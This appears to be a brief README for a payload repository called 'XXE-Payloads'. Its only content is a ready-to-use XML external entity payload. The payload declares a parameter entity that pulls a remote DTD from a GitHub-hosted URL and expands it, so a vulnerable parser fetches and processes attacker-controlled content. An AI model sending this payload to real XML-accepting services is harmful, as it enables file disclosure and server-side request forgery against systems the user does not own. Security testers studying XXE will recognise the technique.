# XXE-Payloads
Quick access to XXE Payloads

XXE:
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/mbadanoiu/XXE-Payloads/main/1.xml">
%sp;
]>
```
